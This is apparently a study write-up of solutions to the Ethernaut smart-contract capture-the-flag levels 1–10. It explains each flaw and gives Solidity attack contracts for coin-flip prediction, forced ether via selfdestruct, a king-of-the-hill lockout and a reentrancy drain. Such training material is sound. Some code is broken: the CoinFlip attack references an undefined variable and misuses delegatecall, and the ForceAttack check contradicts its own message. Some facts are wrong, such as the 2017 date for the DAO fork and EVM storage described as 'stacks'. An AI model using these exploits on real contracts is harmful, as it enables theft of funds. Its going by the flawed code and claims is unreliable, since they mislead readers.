# Ethernauts Solutions!

This is a series of a (mostly) self-created solutions for the famous Ethernauts series by OpenZeppelin. Ethernauts is a great "capture-the-flag" style educational series designed to train Solidity developers in identifying and (hopefully avoiding) subtle vulnerabilities in contracts. 

I highly recommend tracking all your transactions with Etherscan and Tenderly. PRs with more efficient solutions are welcome !!

## P1 - Fallback

A **Fallback** function is a function of last resort for any smart contract. It doesn't have a unique identifier and is invoked when no other function in the contract meets the criteria for an external call. This could happen if an external party mistypes the name of a function, gives the wrong arguments, or simply calls something that doesn't exist. 

Notably, fallback functions are also called when someone sends only ether to a contract (without other information). By default, smart contracts cannot accept such Ether, but they are able to if an appropriate fallback function is implemented in them. 

**Properties** - 

 - Has no name or arguments. Can be marked payable. 
 - Can not return anything. 
 - Can be called by anyone (EOA or Contract)
 - Can be defined once per contract. 
 - It is mandatory to mark it external.
 - Limited to 2300 gas when called by another function. 

**Vulnerability** - Fallback function enables the transfer of ownership of this contract. 

**Exploit** - 

Step 1 - Call the "contribute" function with the requisite amount of seed capital 
Step 2 - Send a transaction without the data field to send a menial amount of Ether.

Useful code - *contract.sendTransaction({from: player,value: toWei(...)})*

**Learning** - 

 - Follow check-emt-interactions in fallbacks too 
 - Emit an event for any state change in a fallback 
 - Do not implement ownership change or other important state changes in a fallback

##  P2 - Fallout 

This problem just goes to show - being a giga-brain isn't always the best thing to defend yourself against an exploit. You have to develop an "adversarial" mindset if you want to write contracts. In this case, the point is whoever wrote this contract wanted it to be hacked. 

Here, note the word "fallout" is misspelled and can easily be called by anyone to change ownership of the contract. Be observant, and don't just plainly trust whoever wrote the contract. 


## P3 - Coin Flip

A lot of modern cryptography depends on random numbers. By extension, so does web3 and blockchain tech. As such, the integrity of these random numbers becomes very important. How truly random are they ? 

The reader is advised that a computer generates much differently from the human brain. It follows an algorithm. So, the number it spits out isn't really random after all. Then, it all becomes a problem of - can someone predict which number these algorithm will spit out  in advance. 

Short answer - if you are using a commonly available piece of information as input to this algorithm - someone can. Timestamps and block numbers are good examples of such common knowledge. 

**Vulnerability** - The contract uses the publicly available block number as input. 

**Exploit** - 

Step 1 - Replicate the randomness logic of the contract in Remix IDE
Step 2 - Using the block number, generate deterministic random numbers
Step 3 (Automation)  - Call the victim contract from your contract so block numbers sync
Step 3 - Feed into contract 10 times over, with slight delays between each  

    // SPDX-License-Identifier: MIT    
    pragma  solidity  ^0.8.7;

    contract CoinFlipAttack {

	    uint256 lastHash;
	    address  public victimContract;
	    uint256 FACTOR =  57896044618658097711785492504343953926634992332820282019728792003956564819968;
	   
	    constructor(address _victimContractAddress)  {
		    victimContract = _victimContractAddress;
	    }
	        
	    function flipResult(uint _blockNumber)  public  returns  (bool side)  {
		    uint256 blockValue =  uint256(blockhash(_blockNumber));
		    if  (lastHash == blockValue)  {
				revert();
			}
			lastHash = blockValue;
			uint256 coinFlip = blockValue / FACTOR;
		    side = coinFlip ==  1  ?  true  :  false;
	    }
	    
	      
	    
	    function attackContract()  external  returns(bool success)  {
		    bool guess = flipResult(block.number);
		    (success,  )  = attackContractAddress.delegatecall(abi.encodeWithSignature("flip(bool)", guess));
		   }
    }

**Learning** - 

 - Use verifiable randomness, as offered by Chainlink et al. wherever needed 
 - Execute atomic transactions to ensure conditions are either fully met or reverted

## P4 - Telephone

This example highlights the glaring difference between `tx.origin` and `msg.sender` primitives. While `msg.sender` can take various forms depending on whether you are calling a function through a proxy contract delegate call etc. - `tx.origin` is always you (the original caller).

**Vulnerability** - The contract uses `tx.origin` as an authentication point for an agent. 

**Exploit** - 

Step 1 - Make a bogus contract and call the changeOwner() function through it. 

**Learning** - 

 - Never use `tx.origin` as a means to authorize or validate a wallet in your contract.
 
## P5 - Token (Deprecated)

Following Solidity 0.8.0, integer overflows are no longer feasibly in smart contract. Before that, contracts would have to be written using OpenZeppelin's SafeMath Library. This is integrated into Solidity now. 

## P6 - Delegation 

The Delegate Call is a very powerful idea in solidity - since it allows an agent to interact with a contract through an intermediatory contract whilst maintain their status as "caller". This idea underpins complex developments like upgradeable smart contracts. 

![](https://miro.medium.com/max/875/1*4OB3IwTF1AkW6zH3tJv8Tw.png)

For further analysis, compare this image with a standard call, as described in the image below - 
![](https://miro.medium.com/max/875/1*PwYIsFyDM60IW4KuDkUncA.png)

The most important thing to remember is that even though the EOA is making a "function call" to the target contract, the execution of this function will **not** change the state of the target contract. It will change the state of the caller contract, at precisely the same position in it's stack that corresponds with whatever that function would have changed in the target contract. 

In this example, we notice that the fallback function allows us to make a delegate call to another contract, that can possibly help us become the contract owner. Good for us, the delegate call will not change the owner of the Delegate() contract, but that of Delegation(). 

**Vulnerability** - The contract  exposes ownership to an unsecured delegate call.

**Exploit** - 

Step 1 - Create a function call to the Delegation() contract, calling pwn() 
Step 2 - Since pwn() does not exist in Delegation, it will invoke Delegate() 
Step 3 - Since state change happens on Delegation() - we become the owner 


    await sendTransaction({
      from: "<Your address>",
      to: "<Target contract address>",
      data: "0xdd365b8b0000000000000000000000000000000000000000000000000000000000000000"
    });
	
**Design Question** - Why can we not implement this by making a bogus contract and calling a delegate call through that ?

Because, delegate calls only work at the end points of the chain. That means, even if you have 5 contracts linked together in a chain of delegate calls from one to another - 
say D1 -> D2 -> D3 -> D4 -> D5 - the logic will be executed from D5 and the state will only be changed in D1.

In this case, that means you will end up being the owner of the bogus contract you create and nothing else. 

**Learning** - 

 - Authenticate and do conditional checks on functions that invoke, or can be invoked by a delegate call 
 - Avoid making state changes through delegate calls  

## P7 - Force

As mentioned before, a smart contract **cannot** just receive random ether from anywhere. There are only 3 scenarios in which a contract can get Ether. These are - 

 - Via **payable functions**:  Fallback functions can be included in a
   contract to intentionally allow your contract to receive Ether from
   other contracts and external wallets.
 - Via **mining reward**: contract addresses can be designated as the   
   recipients of mining block rewards.
 - Via a **destroyed contract**: Selfdestruct() lets you designate a backup   
   address to receive the remaining ethers from the contract you are   
   destroying.

In this case, our contract has no implementation - so no contract code to exploit. So we will just make a bogus contract and destroy that to fund this contract. 

**Exploit** - 

    // SPDX-License-Identifier: MIT
    pragma  solidity  ^0.8.7;
    
    contract ForceAttack {
    
	    address  public victimContract;
    
	    constructor(address _victimContractAddress)  payable  {
		    require(msg.value <=  0.001 ether,  "Please seed the contract");
		    victimContract = _victimContractAddress;
	    }
    
	    function attackContract() external  {
		    selfdestruct(payable(address(victimContract)));
	    }
    }
    
**Learning** - 

 - Never use the balance of your contract as a check for anything, it can be altered

## P8 - Vault 

Spoiler alert - making a variable private does not mean only your contract can access it. Blockchains are inherently transparent, and private variables can be seen by a one who wants to, albeit with a little more effort. To do so, all we need to do is understand how a contract's data is stored. 

Ethereum Virtual Machine (EVM) is a stack-based Turing-complete machine. This means it is different from your typical computer, which is register-based. The EVM's sotrage scheme is comprised of "stacks" of 32-bytes each. All in all, the EVM can have 2^256 such stacks. 

Each smart contract has its own storage to reflect the state of the contract. The values in storage persist across different function calls. And each storage is tethered to the smart contract’s address. This means, by making a specific EVM-level call, you can access the stacks of each contract. 

 **Vulnerability** - The contract  password is stored as a private variable. 

**Exploit** - 

We know the password is stored as a 32-byes value. So, it will have a whole stack associated with it. In this case, this will be the stack at index 1.

    web3.eth.getStorageAt(/* contractAddress */, 1)
        
The result will be hex value of the password we need. To convert it further, we can use the helpful utils library in web3.js - 

    web3.utils.toAscii("")

And finally, we will have the password we are looking for. 

**Learning** - 

 - Always store the **hash** of a confidential value, never the plain text.

As the transaction sender, you are always susceptible to the following cases:

## P9 - King 

In this example, we are once again reminded that if our contract sends Ether to another one - it has to rely on the other contracts receiving mechanism to complete it's workflow. In other words, for a while, your contract is no longer in charge of it's own functioning. 

Such a function call generally comes with three loopholes worth remembering - 

-   **Issue 1**: The receiving contract doesn’t have a payable fallback function, cannot receive Ethers, and will throw an error upon a payable request.
-   **Issue 2**: The receiving contract has a malicious payable fallback function that throws an exception and fails valid transactions.
-   **Issue 3**: The receiving contract has a malicious payable function that consumes a large amount of gas, which fails your transaction or over-consumes your gas limit.

Due to this, the "safe-transfer" workflow is generally recommended for solidity contracts. This contract does not follow that workflow at all. 

 **Vulnerability** - The contract  relies on external agent for complete execution. 

**Exploit** - 

Step 1 - Make a bogus contract and transfer some Eth to the victim contract through that using a Delegate Call. Now you are the owner. 
Step 2 - Implement a fallback function which always reverts whenever value is transferred to it. 
Step 3 - Now, the other contract can never reclaim ownership from you. 

    // SPDX-License-Identifier: MIT
    pragma  solidity  ^0.8.7;
    
    contract KingAttack {
    
	    address  public victimContract;
	    uint256  public valueToExceed;
	    
	    constructor(address _victimContractAddress)  payable  {
		    valueToExceed = _victimContractAddress.balance;
		    require(msg.value > valueToExceed,  "Please seed the contract");
		    victimContract = _victimContractAddress;
	    }
	    
	    function attackContract()  external  payable  returns(bool success)  {
		    require(msg.value > valueToExceed,  "This will not work");
		    (success,  )  =  address(victimContract).call{value: valueToExceed}(abi.encodeWithSignature(""));
	    }
    
	    receive()  external  payable  {
		    revert();
	    }
    
    }

**Learning** - 

-   Never assume transactions to external contracts will be successful
-   Make sure to handle failed transactions on the client side in the event you do depend on transaction success to execute other core logic

## P10 - Re Entrancy  

If there's a celebrity exploit out there, it is this one. A re-entrancy attack, though quite un-intuitive at first - is the reason Ethereum had to be forked in 2017 into Eth Classic and Eth. I recommend you study this properly, so here is an [article](https://quantstamp.com/blog/what-is-a-re-entrancy-attack) for reference. 

 **Vulnerability** - Withdrawal function is easily re-entrant. 

**Exploit** - 

Step 1 - Make a re-entracy attack contract, and implement the requisite fallback function in it 
Step 2 - Call the withdrawal function repeatedly till the contract is safely out of Eth. 

    // SPDX-License-Identifier: MIT
    pragma  solidity  ^0.8.7;
    
    contract ReentrancyAttack {
    
	    address  public victimContract;
	    event WithdrawalPerformed(uint256  indexed _valueExtracted,  bool _status);
	    
	    constructor(address _victimContractAddress)  payable  {
		    require(msg.value >=  0.001 ether,  "Please seed the contract");
		    victimContract = _victimContractAddress;
	    }
	    
	    function attackContract()  external  payable  returns(bool success)  {
		    require(msg.value >=  0.001 ether,  "Please seed the contract");
		    (success,  )  =  address(victimContract).call{value:  0.001 ether}(abi.encodeWithSignature("donate(address)",  address(this)));
	    }
	    
	    function withdrawLoot()  external  returns(bool success){
		    payable(msg.sender).transfer(address(this).balance);
		    success =  true;
	    }
	    
	    receive()  external  payable  {
		    if  (address(victimContract).balance >  0)  {
		    (bool success,  )  =  address(victimContract).call(abi.encodeWithSignature("withdraw(uint)",  address(victimContract).balance));
		    emit WithdrawalPerformed(address(victimContract).balance, success);
		    }
	    }
    
    }
     


